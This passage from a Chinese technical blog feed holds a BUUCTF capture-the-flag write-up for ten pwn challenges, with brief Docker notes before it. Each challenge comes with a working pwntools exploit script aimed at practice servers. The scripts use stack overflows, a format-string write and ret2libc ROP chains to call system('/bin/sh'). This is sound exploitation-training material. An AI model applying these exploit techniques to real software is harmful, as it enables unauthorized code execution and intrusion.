    <content type="html"><![CDATA[<h1 id="Docker常用指令及原理"><a href="#Docker常用指令及原理" class="headerlink" title="Docker常用指令及原理"></a>Docker常用指令及原理</h1><h2 id="run指令原理"><a href="#run指令原理" class="headerlink" title="run指令原理"></a>run指令原理</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182202852.png" alt="image-20230803223957561"></p><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><p>Docker是一个Client-Sever结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p><p>DockerSever接收到DockerClient的指令，就会执行这个命令。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182202788.png" alt="image-20230803230548099"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182202472.png" alt="image-20230803231957633"></p>]]></content>
    
    
    <categories>
      
      <category>软件</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1~10</title>
    <link href="/2023/08/01/WP/BUUCTF/1-10/"/>
    <url>/2023/08/01/WP/BUUCTF/1-10/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF（1-10题wp）"><a href="#BUUCTF（1-10题wp）" class="headerlink" title="BUUCTF（1~10题wp）"></a>BUUCTF（1~10题wp）</h1><h2 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h2><p>运行，直接利用system函数“cat flag”即可。</p><h2 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h2><h3 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182057750.png" alt="2.1"></p><p>发现gets危险输入</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182058955.png" alt="2.2"></p><p>看到fun函数调用了“system”，找到fun的地址 0x401186</p><p>则利用gets溢出返回到fun函数地址即可</p><h3 id="2-Payload"><a href="#2-Payload" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = remote(&quot;node4.buuoj.cn&quot;,28996)<br><br>system_addr = 0x401186<br>sh.sendline(b&#x27;A&#x27;*15+b&#x27;a&#x27;*8 + p64(system_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><strong>PS</strong>：有时栈的大小未知，需要利用GDB调试出偏移地址的大小。</p><h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h2><h3 id="1-解题思路-1"><a href="#1-解题思路-1" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182058982.png" alt="3.1"></p><p>发现flag提示</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182058521.png" alt="3.2"></p><p>找到调用system的函数地址：0x400611</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182059476.png" alt="3.3"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182059919.png" alt="3.4"></p><h3 id="2-GDB调试找偏移地址"><a href="#2-GDB调试找偏移地址" class="headerlink" title="(2)GDB调试找偏移地址"></a>(2)<em>GDB调试找偏移地址</em></h3><p>1.打断点</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182059394.png" alt="point1"></p><p>2.先 r 一下</p><p><strong>3.利用cyclic函数生成构造的字符串队列，作为程序的输入。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182100388.png"></p><p><strong>4.利用”cyclic -l 中断字符串“计算得出偏移：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182100891.png" alt="point3"></p><p><strong>PS</strong>：由于char构造的字符数组在实际分配内存时会多占用一个字节的内存。多出来的一个字节用来存储”\0”用来表示字符串的结束。</p><p>故所得偏移地址为64字节，即0x40为栈的大小。</p><h3 id="3-Payload"><a href="#3-Payload" class="headerlink" title="(3)Payload"></a>(3)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>sh = remote(&#x27;node4.buuoj.cn&#x27;,29352)<br>payload=B&#x27;a&#x27;*(0x40+8)+p64(0x400611)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h2><h3 id="1-解题思路-2"><a href="#1-解题思路-2" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182100611.png" alt="4.1"></p><p>进入fun( )函数中</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182101576.png" alt="4.2"></p><p><strong>发现需要利用gets函数溢出到v2的地址，并修改v2的值为11.28125，从而返回system函数拿到flag。</strong></p><p>找到v2和v1的地址</p><p> <img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182101118.png" alt="4.3"></p><p>偏移地址&#x3D;0x30-0x04&#x3D;0x2c</p><p>11.28125&#x3D;0x41348000</p><h3 id="2-Payload-1"><a href="#2-Payload-1" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,26573)<br>payload=B&#x27;a&#x27;*0x2c+p64(0x41348000)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h2><h3 id="1-解题思路-3"><a href="#1-解题思路-3" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182101762.png" alt="5.1"></p><p>发现只有一个“vuln()”函数，点进去</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182101231.png" alt="5.2"></p><p>在网上搜索大佬的解释，发现fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，但是这个程序有点意思的地方就在于<strong>会将一个字节的“I”替换成三个字节的“you”</strong><br>那么思路来了，我们输入20字节的 “I” ，经过第19行的replace函数后会变成60字节的 “you” ，这样就可以进行溢出了，之后覆盖ebp，覆盖返回地址为输出flag的函数地址，就可以完成利用！</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182103534.png"></p><p>然后用 <kbd>Shift</kbd>+<kbd>F12</kbd> 来查看程序里的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182103187.png" alt="image-20230405114511713"></p><p>发现有明显的flag提示</p><p>找到调用“system”函数的地址</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182104500.png" alt="5.4"></p><p>get_flag函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182104918.png" alt="5.5"></p><h3 id="2-Payload-2"><a href="#2-Payload-2" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * <br><br>r=remote(&quot;node4.buuoj.cn&quot;,26622)<br>flag_addr=0x8048F0D<br>payload=B&#x27;I&#x27;*20+B&#x27;a&#x27;*4+p32(flag_addr)<br><br>r.sendline(payload)<br><br>r.interactive() <br></code></pre></td></tr></table></figure><h2 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h2><h3 id="1-解题思路-4"><a href="#1-解题思路-4" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182104623.png" alt="image-20230406203902084"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182105004.png" alt="image-20230406203930751"></p><p><strong>可以利用read函数制造栈溢出。</strong></p><p>在函数列表中发现调用system函数的提示</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182105475.png" alt="image-20230406204054142"></p><p>果然</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182105986.png" alt="image-20230406203837624"></p><p>记录该函数地址：0x400596</p><p>GDB调试出偏移地址为136字节，即0x88为栈的大小。</p><h3 id="2-Payload-3"><a href="#2-Payload-3" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,29850)<br>payload=B&#x27;a&#x27;*0x88+p64(0x400596)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="7-第五空间2019-决赛-PWN5-Canary绕过"><a href="#7-第五空间2019-决赛-PWN5-Canary绕过" class="headerlink" title="7.[第五空间2019 决赛]PWN5 (Canary绕过)"></a>7.[第五空间2019 决赛]PWN5 (Canary绕过)</h2><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182106139.png"></p><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182106428.png" alt="image-20230406210826989"></p><p>根据网上的解释，函数的功能是读入一个4位的随机密码，再将我们输入的密码与随机生成数比较，相同就执行system。</p><p>这里面的printf（）存在<strong>格式化字符串漏洞</strong></p><h3 id="printf（）格式化字符串漏洞"><a href="#printf（）格式化字符串漏洞" class="headerlink" title="printf（）格式化字符串漏洞"></a>printf（）格式化字符串漏洞</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182106112.png" alt="image-20230409172725613"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182115457.png"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用 “AAAA %08x %08x %8x %08x %08x %08x %08x………… “,这样的字符串来找到我们输入的参数在函数栈上的位置，即首地址偏移或者偏移量</p><p>2.假设是在栈上第n位，那么可以利用 %n$ 定位到参数在栈上的位置</p><p>3.利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据</p><p>首先我们要定位到我们输入的字符串在栈上的位置。</p><p>我们输入的参数是在栈上的第10个，后面可以直接利用 %10$ 定位到这个位置。<br>随机生成函数的位置是0x804c044开始的，长度为4字节,依次+1即可。</p><p>所以可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这这个地址里的内容</p><h3 id="绕过Canary保护机制"><a href="#绕过Canary保护机制" class="headerlink" title="绕过Canary保护机制"></a>绕过Canary保护机制</h3><p>先用GDB运行一下</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182115849.png"></p><p>发现”AAAA“的ASCII编码“41414141”离首字节有10个字符串，故输入的字符定位在函数栈上的第10个位置，后面可以直接利用 %10$ 定位到这个位置。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182116252.png"></p><p>从主函数中能看到随机生成函数的位置是0x804C044开始的，长度为4字节,依次+1即可。</p><p>所以可以用<code>%10$,%11$,%12$,%13$</code>去定位到这4个地址，再用%n修改这这个地址里的内容，因此构造payload</p><h3 id="2-Payload-4"><a href="#2-Payload-4" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>c = remote(&quot;node4.buuoj.cn&quot;,28635)<br><br>payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)<br>payload+=B&#x27;%10$n%11$n%12$n%13$n&#x27;<br><br>c.sendline(payload)<br>c.sendline(str(0x10101010))<br>c.interactive()<br></code></pre></td></tr></table></figure><p><strong>payload分析：</strong></p><blockquote><ol><li><p><code>payload = p32(0x804c044) + p32(0x804c045) + p32(0x804c046) + p32(0x804c047)</code>：构造一个字符串，其中包含4个32位整数，分别是<code>0x804c044</code>、<code>0x804c045</code>、<code>0x804c046</code>和<code>0x804c047</code>。这些整数是用于指定格式化字符串漏洞中待写入的地址。</p></li><li><p><code>payload += b&#39;%10$n%11$n%12$n%13$n&#39;</code>：在已构造的字符串后追加一个格式化字符串，其中使用了格式化字符串的特殊格式<code>%n</code>。<code>%n</code>的作用是将前面的字符数（即已输出的字符数）写入到对应的地址中。具体来说，<code>%10$n</code>表示将已输出的字符数写入到第10个参数所指向的地址中，<code>%11$n</code>表示将已输出的字符数写入到第11个参数所指向的地址中，以此类推。</p></li></ol><p>利用格式化字符串漏洞，将已输出的字符数写入到指定的地址中。通过在payload中指定不同的地址，可以将相应的值写入到这些地址中。根据payload中的内容，第10个参数的地址将被写入<code>0x804c044</code>，第11个参数的地址将被写入<code>0x804c045</code>，以此类推。这样，当程序执行到这个payload时，它会将已输出的字符数写入到指定的地址中，实现对这些地址的写入操作从而覆盖原有的canary保护。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182116479.png"></p><h2 id="8-ciscn-2019-c-1-libc泄露地址"><a href="#8-ciscn-2019-c-1-libc泄露地址" class="headerlink" title="8.ciscn_2019_c_1 (libc泄露地址)"></a>8.ciscn_2019_c_1 (libc泄露地址)</h2><h3 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h3><p>例行检查</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182118809.png"></p><p>开启了栈不可执行，因此shellcode方法失效</p><p>用 <kbd>F5</kbd> 查看伪代码</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182118464.png"></p><p>尝试先在GDB中运行一下，发现这是一个输入1&#x2F;2&#x2F;3来进入以下三个函数的程序</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182119654.png"></p><p>进入这三个函数查看，在encrypt函数中发现gets，因此估计是一道ret2libc的题目，由于这是64位程序，寻找”pop、rdi、ret“就行</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182120407.png" alt="image-20230530180246796"></p><p>使用ROPgadget寻找</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182120486.png" alt="image-20230530174718768"></p><h3 id="2-Payload-5"><a href="#2-Payload-5" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&quot;./ciscn_2019_c_1&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25096</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>encrypt_addr = elf.symbols[<span class="hljs-string">&quot;encrypt&quot;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your choice!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>,payload)<br>io.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)<br>puts_addr = u64(io.recvline().strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x08</span>) + p64(ret) +p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)<br>io.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>脚本分析：</p><blockquote><ol start="4"><li><p><code>puts_plt = elf.plt[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的PLT地址。</p></li><li><p><code>puts_got = elf.got[&quot;puts&quot;]</code>：从ELF对象中获取<code>puts</code>函数的GOT地址。</p></li><li><p><code>pop_rdi_ret = 0x400c83</code>：设置<code>pop rdi; ret</code>指令序列的地址，该指令用于将参数加载到RDI寄存器中。</p></li><li><p><code>ret = 0x4006b9</code>：设置<code>ret</code>指令的地址，该指令用于返回函数调用。</p></li><li><p><code>encrypt_addr = elf.symbols[&quot;encrypt&quot;]</code>：从ELF对象中获取<code>encrypt</code>函数的地址。</p></li><li><p><code>main_addr = elf.symbols[&#39;main&#39;]</code>：从ELF对象中获取<code>main</code>函数的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</code>：构造payload用于触发漏洞。payload包括一些填充数据（<code>b&#39;a&#39; * (0x50 + 0x08)</code>）和ROP链。ROP链的作用是构造栈上的一系列指令序列，以实现漏洞利用的目的。具体来说，这个ROP链的作用是调用<code>puts(puts_got)</code>，将<code>puts</code>函数的真实地址泄露出来，以便后续计算libc基址。</p></li><li><p><code>io.sendlineafter(&quot;Input your choice!\n&quot;,str(1))</code>：发送字符串”1”给远程服务，用于选择相应的功能。</p></li><li><p><code>io.sendlineafter(&quot;Input your Plaintext to be encrypted\n&quot;,payload)</code>：发送payload给远程服务，用于触发漏洞。</p></li><li><p><code>io.recvuntil(b&quot;Ciphertext\n&quot;)</code>：接收远程服务发送的数据，直到遇到字符串”Ciphertext\n”。</p></li><li><p><code>io.recvuntil(b&quot;\n&quot;)</code>：接收远程服务发送的数据，直到遇到换行符。</p></li><li><p><code>puts_addr = u64(io.recvline().strip().ljust(8,b&#39;\0&#39;))</code>：接收远程服务发送的数据，将其转换为64位整数，即<code>puts</code>函数的真实地址。</p></li><li><p><code>libc = LibcSearcher(&quot;puts&quot;,puts_addr)</code>：创建LibcSearcher对象，以便后续通过<code>puts</code>函数地址查找libc基址和其他函数地址。</p></li><li><p><code>libcbase = puts_addr - libc.dump(&#39;puts&#39;)</code>：计算libc基址。</p></li><li><p><code>system_addr = libcbase + libc.dump(&#39;system&#39;)</code>：计算<code>system</code>函数的地址。</p></li><li><p><code>str_bin_sh = libcbase + libc.dump(&#39;str_bin_sh&#39;)</code>：计算<code>&quot;/bin/sh&quot;</code>字符串的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(ret) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)</code>：构造新的payload，其中包括填充数据、ROP链和<code>/bin/sh</code>字符串地址。这个ROP链的作用是调用<code>system(&quot;/bin/sh&quot;)</code>函数。</p></li></ol></blockquote><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="(3)总结"></a>(3)总结</h3><p>通过漏洞泄露<code>puts</code>函数的真实地址，并计算出libc基址。然后，构造合适的ROP链来调用<code>system</code>函数，并传递<code>&quot;/bin/sh&quot;</code>字符串作为参数，从而获取shell权限。</p><ol><li>找到函数地址：首先，使用<code>ELF</code>模块获取目标二进制文件中函数的地址。在脚本中，通过<code>elf.plt</code>和<code>elf.got</code>来获取<code>puts</code>函数的<code>plt</code>和<code>got</code>表项的地址，以及<code>encrypt</code>和<code>main</code>函数的地址。</li><li>构造漏洞触发payload：在脚本中，通过构造一系列的字节串来构造payload。首先，用<code>b&#39;a&#39; * (0x50 + 0x08)</code>填充到缓冲区，然后利用<code>pop_rdi_ret</code>和<code>puts_got</code>地址，以及<code>puts_plt</code>函数的地址，构造ROP链。最后，使用<code>encrypt</code>函数的地址，将payload发送给目标程序。</li><li>泄露libc基址和获取系统函数地址：通过接收目标程序返回的数据，获取泄露的<code>puts</code>函数的地址。然后，使用<code>LibcSearcher</code>模块根据泄露的<code>puts</code>函数地址来搜索libc库，并计算出libc基址。最后，通过libc基址计算出<code>system</code>函数的地址和<code>/bin/sh</code>字符串的地址。</li><li>构造第二个payload：使用泄露的libc基址、<code>ret</code>指令地址、<code>pop_rdi_ret</code>指令地址和<code>/bin/sh</code>字符串地址，构造第二个payload。ROP链的顺序为：<code>ret</code>、<code>pop_rdi_ret</code>、<code>/bin/sh</code>、<code>system</code>、<code>main</code>。</li><li>发送第二个payload获取shell：将第二个payload发送给目标程序，成功获取到shell。</li></ol><h2 id="9-ciscn-2019-c-8"><a href="#9-ciscn-2019-c-8" class="headerlink" title="9.ciscn_2019_c_8"></a>9.ciscn_2019_c_8</h2><h3 id="1-解题思路-5"><a href="#1-解题思路-5" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，发现保护全开了</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182120202.png" alt="image-20230525194900327"></p><p>进入IDA看一下</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182121835.png" alt="image-20230525195520113"></p><p>发现只需要让var[13] &#x3D; 17 就可以调用system函数了</p><p>这里需要注意：</p><blockquote><p>&#x3D;&#x3D;qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节&#x3D;&#x3D;</p></blockquote><p>所以代码的意思是要将var[13]之后的8个字节的数据赋值为17。</p><h3 id="（2）payload"><a href="#（2）payload" class="headerlink" title="（2）payload"></a>（2）payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29179</span>)<br>p.sendline(p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="10-jarvisoj-level2"><a href="#10-jarvisoj-level2" class="headerlink" title="10.jarvisoj_level2"></a>10.jarvisoj_level2</h2><h3 id="1-解题思路-6"><a href="#1-解题思路-6" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182121691.png" alt="image-20230530204940268"></p><p>IDA中函数很简单，</p><p>开了NX就不能用shellcode了，另外程序没有开canary（栈溢出检测）、内存地址随机化（PIE），所以用基本的ROP</p><p>找system和\bin\sh地址</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182125792.png" alt="image-20230530211058479"></p><p>system_addr&#x3D;0x8048320</p><p>shell_addr&#x3D;0x804a024</p><p>buf的大小是0x88，读入的数据大小是0x100，可以溢出0x78个字节</p><h3 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28703</span>)<br>binsh_addr=<span class="hljs-number">0x804a024</span><br>system_addr=<span class="hljs-number">0x8048320</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(<span class="hljs-number">8</span>)+p32(binsh_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>五、程序的编写与执行</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/</url>
    
